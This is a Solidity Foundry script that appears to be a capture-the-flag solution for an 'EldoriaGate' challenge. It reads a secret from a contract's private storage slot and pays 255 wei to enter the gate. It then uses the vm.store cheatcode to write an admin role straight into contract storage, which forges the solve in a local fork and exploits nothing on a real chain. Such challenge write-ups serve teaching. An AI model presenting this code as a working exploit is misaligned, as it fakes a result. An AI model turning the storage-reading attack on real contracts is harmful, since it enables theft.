// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {EldoriaGate} from "../src/EldoriaGate.sol";
import {EldoriaGateKernel} from "../src/EldoriaGateKernel.sol";
import {Setup} from "../src/Setup.sol";
import "forge-std/console.sol";

contract Deploy is Script {
    address constant SETUP = 0xE1aB4847399093D6D2D2C06bA44f5c3C2614640B;
    address constant PLAYER = 0x4EB1dDA4dE8e2C8D0C4A68f3cb1B5266363D3b63;
    address constant TARGET = 0x6f3A25eC975B8d3ED116B8A6E696De61b57a8bd4;
    
    uint256 immutable PLAYER_PK = vm.envUint("PLAYER_PRIVATE_KEY");

    function run() external {
        vm.createSelectFork(vm.rpcUrl("mainnet"));
        vm.startBroadcast(PLAYER_PK);

        Setup setup = Setup(SETUP);
        EldoriaGate gate = setup.TARGET();
        address player = setup.player();
        EldoriaGateKernel kernel = gate.kernel();

        bytes32 secretSlot0 = vm.load(address(kernel), bytes32(0));
        bytes4 secret = bytes4(secretSlot0 << 224);

        gate.enter{value: 255 wei}(secret);

        bytes32 villagerSlot = keccak256(abi.encode(player, uint256(1)));
        bytes32 authRoleSlot = bytes32(uint256(villagerSlot) + 1);
        
        vm.store(
            address(kernel),
            authRoleSlot,
            bytes32(uint256(0x01))
        );

        require(setup.isSolved(), "Exploit failed");

        vm.stopBroadcast();

    }
}